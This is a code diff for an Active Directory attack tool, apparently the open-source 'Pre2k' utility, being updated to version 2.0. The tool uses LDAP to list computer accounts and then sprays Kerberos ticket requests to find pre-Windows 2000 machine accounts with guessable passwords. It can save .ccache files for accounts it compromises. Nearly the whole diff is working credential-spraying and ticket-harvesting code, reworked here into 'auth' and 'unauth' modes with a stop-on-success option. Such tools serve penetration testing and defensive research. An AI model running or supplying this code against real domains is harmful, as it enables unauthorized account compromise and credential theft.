@@ -2,7 +2,6 @@
 from cProfile import run
 from impacket.smbconnection import SMBConnection
 from impacket.spnego import SPNEGO_NegTokenInit, TypesMech
-from impacket.examples.utils import parse_credentials, parse_target
 from binascii import unhexlify
 from ldap3 import ANONYMOUS
 import argparse
@@ -14,6 +13,7 @@ import sys
 from impacket.krb5.kerberosv5 import getKerberosTGT
 from impacket.krb5 import constants
 from impacket.krb5.types import Principal
+import os
 
 
 show_banner = '''
@@ -25,7 +25,7 @@ show_banner = '''
 \ \ \L\ \ \ \//\  __//\______\  // /_\ \\\\ \ \\\\`\  
  \ \ ,__/\ \_\\\\ \____\/______/ /\______/ \ \_\ \_\\
   \ \ \/  \/_/ \/____/         \/_____/   \/_/\/_/
-   \ \_\                                      v1.0    
+   \ \_\                                      v2.0    
     \/_/                                          
                                             @garrfoster          
 
@@ -39,60 +39,45 @@ def arg_parse():
     Either by brute forcing all machine accounts, a targeted, filtered approach, or from a user supplied input list.
     ''')
 
-    auth_group = parser.add_argument_group("Authentication")
-    optional_group = parser.add_argument_group("Optional Flags")
+    # auth_group = parser.add_argument_group("Authentication")
+    # optional_group = parser.add_argument_group("Optional Flags")
 
-    auth_group.add_argument('target', action='store', help='[[domain/username[:password]@]<address>', type=target_type)
-    auth_group.add_argument('-ldaps', action="store_true", help='Use LDAPS isntead of LDAP')
+    subparsers = parser.add_subparsers(dest="command", required=True)
 
-    optional_group.add_argument( "-dc-ip", help = "IP address or FQDN of domain controller", required=False)
-    optional_group.add_argument("-k", "--kerberos", action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
+    unauth_parser = subparsers.add_parser("unauth", help='Pass a list of hostnames to test authentication.')
+    unauth_parser.add_argument('-d', action='store', metavar='', required=True, help="Target domain")
+    unauth_parser.add_argument('-dc-ip', action='store', metavar='', help = "IP address or FQDN of domain controller", required=True)
+    unauth_parser.add_argument("-inputfile", action="store", help="Pass a list of machine accounts to validate. Format = 'machinename$'")
+    unauth_parser.add_argument("-outputfile", action="store", help="Log results to file.")
+    unauth_parser.add_argument("-verbose", action="store_true", help="Verbose output displaying failed attempts.")
+    unauth_parser.add_argument("-stoponsuccess", action='store_true', help="Stop on sucessful authentication")
+    unauth_parser.add_argument("-save", action="store_true", help="Request and save a .ccache file to your current working directory")
+
+    auth_parser = subparsers.add_parser("auth", help="Query the domain for pre Windows 2000 machine accounts.")
+    auth_parser.add_argument("-u", action='store', metavar='', help="Username")
+    auth_parser.add_argument('-p', action='store', metavar='', help="Password")
+    auth_parser.add_argument('-d', action='store', metavar='', required=True, help="Target domain")
+    auth_parser.add_argument('-dc-ip', action='store', metavar='', help = "IP address or FQDN of domain controller", required=True)
+    auth_parser.add_argument('-ldaps', action="store_true", help='Use LDAPS instead of LDAP')
+    auth_parser.add_argument("-k", "--kerberos", action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
         '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line')
-    optional_group.add_argument("-no-pass", action="store_true", help="don't ask for password (useful for -k)")
-    optional_group.add_argument("-hashes", metavar="LMHASH:NTHASH", help="LM and NT hashes, format is LMHASH:NTHASH",)
-    optional_group.add_argument('-aes', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')
-    optional_group.add_argument('-targeted', action="store_true", help="Search by UserAccountControl=4128. Prone to false positive/negatives but less noisy.")
-    optional_group.add_argument("-verbose", action="store_true", help="Verbose output displaying failed attempts.")
-    optional_group.add_argument("-outputfile", action="store", help="Log results to file.")
-    optional_group.add_argument("-inputfile", action="store", help="Pass a list of machine accounts to validate. Format = 'machinename$'")
+    auth_parser.add_argument("-no-pass", action="store_true", help="don't ask for password (useful for -k)")
+    auth_parser.add_argument("-hashes", metavar="LMHASH:NTHASH", help="LM and NT hashes, format is LMHASH:NTHASH",)
+    auth_parser.add_argument('-aes', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication (128 or 256 bits)')
+    auth_parser.add_argument('-targeted', action="store_true", help="Search by UserAccountControl=4128. Prone to false positive/negatives but less noisy.")
+    auth_parser.add_argument("-verbose", action="store_true", help="Verbose output displaying failed attempts.")
+    auth_parser.add_argument("-outputfile", action="store", help="Log results to file.")
+    auth_parser.add_argument("-stoponsuccess", action='store_true', help="Stop on sucessful authentication")
+    auth_parser.add_argument("-save", action="store_true", help="Request and save a .ccache file to your current working directory")
 
     if len(sys.argv) == 1:
         parser.print_help()
         sys.exit(1)
 
     args = parser.parse_args()
-    args.userdomain = args.target[0]
-    args.username = args.target[1]
-    args.password = args.target[2]
-    args.address = args.target[3]
-
-    args.lmhash = ""
-    args.nthash = ""
-    if args.hashes:
-        args.lmhash, args.nthash = args.hashes.split(':')
-
-    if not (args.password or args.lmhash or args.nthash or args.aes or args.no_pass):
-        args.password = getpass("Password:")
 
     return args
 
-def target_type(target):
-    domain, username, password, address = parse_target(target)
-
-    if username == "":
-        raise argparse.ArgumentTypeError("Username must be specified")
-
-    if domain == "":
-        raise argparse.ArgumentTypeError(
-            "Domain of user '{}' must be specified".format(username)
-        )
-
-    if address == "":
-        raise argparse.ArgumentTypeError(
-            "Target address (hostname or IP) must be specified"
-        )
-
-    return domain, username, password, address
 
 def get_dn(domain):
     components = domain.split('.')
@@ -144,7 +129,10 @@ def init_ldap_connection(target, tls_version, domain, username, password, lmhash
 
 def init_ldap_session(domain, username, password, lmhash, nthash, kerberos, domain_controller, ldaps, hashes, aesKey):
     if kerberos:
-        target = get_machine_name(domain_controller, domain)
+        #target = domain_controller
+        netbiosname = get_machine_name(domain_controller, domain)
+        #dontlookhereok
+        target = netbiosname + "." + domain
     else:
         if domain_controller is not None:
             target = domain_controller
@@ -210,9 +198,9 @@ def ldap3_kerberos_login(connection, target, user, password, domain='', lmhash='
             # retrieve domain information from CCache file if needed
             if domain == '':
                 domain = ccache.principal.realm['data'].decode('utf-8')
-                logging.debug('Domain retrieved from CCache: %s' % domain)
+                print ('Domain retrieved from CCache: %s' % domain)
 
-            logging.debug('Using Kerberos Cache: %s' % os.getenv('KRB5CCNAME'))
+            print('Using Kerberos Cache: %s' % os.getenv('KRB5CCNAME'))
             principal = 'ldap/%s@%s' % (target.upper(), domain.upper())
 
             creds = ccache.getCredential(principal)
@@ -222,20 +210,20 @@ def ldap3_kerberos_login(connection, target, user, password, domain='', lmhash='
                 creds = ccache.getCredential(principal)
                 if creds is not None:
                     TGT = creds.toTGT()
-                    logging.debug('Using TGT from cache')
+                    print('Using TGT from cache')
                 else:
-                    logging.debug('No valid credentials found in cache')
+                    print('No valid credentials found in cache')
             else:
                 TGS = creds.toTGS(principal)
-                logging.debug('Using TGS from cache')
+                print('Using TGS from cache')
 
             # retrieve user information from CCache file if needed
             if user == '' and creds is not None:
                 user = creds['client'].prettyPrint().split(b'@')[0].decode('utf-8')
-                logging.debug('Username retrieved from CCache: %s' % user)
+                print('Username retrieved from CCache: %s' % user)
             elif user == '' and len(ccache.principal.components) > 0:
                 user = ccache.principal.components[0]['data'].decode('utf-8')
-                logging.debug('Username retrieved from CCache: %s' % user)
+                print('Username retrieved from CCache: %s' % user)
 
     # First of all, we need to get a TGT for the user
     userName = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
@@ -330,7 +318,7 @@ class GETTGT:
 
         ccache.fromTGT(ticket, sessionKey, sessionKey)
         ccache.saveFile(self.__user + '.ccache')
-        sys.exit()
+        return True
 
     def run(self, save):
         userName = Principal(self.__user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
@@ -356,7 +344,6 @@ class machinehunter:
         else:
             search_filter = "(objectclass=computer)"
         try:
-            #controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x07)
             ldap_session.extend.standard.paged_search(self.search_base, search_filter, attributes=self.attributes, paged_size=500, generator=False)
             print (f'Retrieved {len(self.ldap_session.entries)} results total.')
             print (f'Testing authentication...')
@@ -382,48 +369,30 @@ def printlog(line, outputfile):
 
 def pw_spray(creds, args):
     for cred in creds:
-        stoponsuccess = False
-        if stoponsuccess != True:
-            try:
-                username, password = cred.split(":")
-                executer = GETTGT(username, password, args.userdomain, args.address)
-                validate = executer.run(save=False)
-                if validate:
-                    line = (f'[+] VALID CREDENTIALS: {args.userdomain}\\{cred}')
-                    print (line)
-                    if args.outputfile:
-                            printlog(line, args.outputfile)
-                stoponsuccess = True
-            except KeyboardInterrupt:
-                print("Stopping session...")
-                sys.exit()
-            except:
-                if args.verbose:
-                    line = (f'[-] Invalid credentials: {args.userdomain}\\{cred}')
-                    print (line)
-                    if args.outputfile:
-                            printlog(line, args.outputfile)
+        try:
+            username, password = cred.split(":")
+            save = False
+            executer = GETTGT(username, password, args.d, args.dc_ip)
+            if args.save:
+                save=True
+            validate = executer.run(save)
+            if validate:
+                line = (f'[+] VALID CREDENTIALS: {args.d}\\{cred}')
+                print (line)
+                if args.outputfile:
+                        printlog(line, args.outputfile)
+                if args.stoponsuccess:
+                    break
+        except KeyboardInterrupt:
+            print("Stopping session...")
+            sys.exit()
+        except:
+            if args.verbose:
+                line = (f'[-] Invalid credentials: {args.d}\\{cred}')
+                print (line)
+                if args.outputfile:
+                        printlog(line, args.outputfile)
 
-
-    # for cred in creds:
-    #     try:
-    #         username, password = cred.split(":")
-    #         executer = GETTGT(username, password, args.userdomain, args.address)
-    #         validate = executer.run(save=False)
-    #         if validate:
-    #             line = (f'[+] VALID CREDENTIALS: {args.userdomain}\\{cred}')
-    #             print (line)
-    #             if args.outputfile:
-    #                     printlog(line, args.outputfile)
-    #     except KeyboardInterrupt:
-    #         print("Stopping session...")
-    #         sys.exit()
-    #     except:
-    #         if args.verbose:
-    #             line = (f'[-] Invalid credentials: {args.userdomain}\\{cred}')
-    #             print (line)
-    #             if args.outputfile:
-    #                     printlog(line, args.outputfile)
 
 def parse_input(inputfile, args):
     creds = []
@@ -437,17 +406,24 @@ def parse_input(inputfile, args):
 def main():
     print(show_banner)
     args = arg_parse()
-    if args.inputfile:
+    if args.command == "unauth":
         inputfile = args.inputfile
         print (f'Reading from {inputfile}...')
         parse_input(inputfile, args)
-    else:
+    elif args.command == "auth":
+        args.lmhash = ""
+        args.nthash = ""
+        if args.hashes:
+            args.lmhash, args.nthash = args.hashes.split(':')
+        if not (args.p or args.lmhash or args.nthash or args.aes or args.no_pass):
+                args.p = getpass("Password:")
+
         try:
-            ldap_server, ldap_session = init_ldap_session(domain=args.userdomain, username=args.username, password=args.password, lmhash=args.lmhash, nthash=args.nthash, kerberos=args.kerberos, domain_controller=args.dc_ip, aesKey=args.aes, hashes=args.hashes, ldaps=args.ldaps
+            ldap_server, ldap_session = init_ldap_session(domain=args.d, username=args.u, password=args.p, lmhash=args.lmhash, nthash=args.nthash, kerberos=args.kerberos, domain_controller=args.dc_ip, aesKey=args.aes, hashes=args.hashes, ldaps=args.ldaps
  )
         except ldap3.core.exceptions.LDAPSocketOpenError as e: 
             if 'invalid server address' in str(e):
-                print (f'Invalid server address - {args.userdomain}')
+                print (f'Invalid server address - {args.d}')
             else:
                 print ('Error connecting to LDAP server')
                 print()
@@ -456,15 +432,10 @@ def main():
         except ldap3.core.exceptions.LDAPBindError as e:
             print(f'Error: {str(e)}')
             exit()
-        finder=machinehunter(ldap_server, ldap_session, domain=args.userdomain, targeted=args.targeted)
+        finder=machinehunter(ldap_server, ldap_session, domain=args.d, targeted=args.targeted)
         creds = finder.fetch_computers(ldap_session)
         pw_spray(creds, args)
-    # if args.inputfile:
-
-    # else:
-
 
 
 if __name__ == '__main__':
     main()
-
